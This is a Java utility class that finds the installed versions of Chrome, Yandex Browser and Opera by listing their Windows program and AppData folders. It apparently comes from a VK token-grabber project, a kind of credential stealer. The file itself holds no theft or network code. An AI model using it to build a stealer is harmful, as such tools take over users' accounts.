package com.github.dedinc.vktokengrabber.utils;

import java.io.File;

public class Version {

	static String username = System.getenv("USERNAME");

	public static String getChromeVersion() {
		String chrome = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome";
		String[] paths = {"C:\\Program Files\\Google\\Chrome\\Application", "C:\\Program Files (x86)\\Google\\Chrome\\Application", chrome + "\\Application"};
		for (int i = 0; i != paths.length; i++) {
			if (new File(paths[i]).exists()) {
				File[] files = new File(paths[i]).listFiles();
				for (int k = 0; k != files.length; k++) {
					File file = files[k];
					String name = files[k].getName();					
					if (name.contains(".") && file.isDirectory()) {
						return name.split("\\.")[0];
					}
				}
			}
		}
		return null;
	}
	
	public static String getYandexVersion() {
		String yandex = "C:\\Users\\" + username + "\\AppData\\Local\\Yandex\\YandexBrowser";
		String[] paths = {"C:\\Program Files (x86)\\Yandex\\YandexBrowser", "C:\\Program Files\\Yandex\\YandexBrowser", yandex + "\\Application"};
		for (int i = 0; i != paths.length; i++) {
			if (new File(paths[i]).exists()) {
				File[] files = new File(paths[i]).listFiles();
				for (int k = 0; k != files.length; k++) {
					File file = files[k];
					String name = files[k].getName();					
					if (name.contains(".") && file.isDirectory()) {
						return name;
					}
				}
			}
		}
		return null;
	}
	
	public static String getOperaVersion() {
		String path = "C:\\Users\\" + username + "\\AppData\\Local\\Programs\\Opera";
		File[] files = new File(path).listFiles();
		for (int k = 0; k != files.length; k++) {
			File file = files[k];
			String name = files[k].getName();
			if (name.contains(".") && file.isDirectory()) {
				return name.split("\\.")[0];
			}
		}
		return null;
	}
}
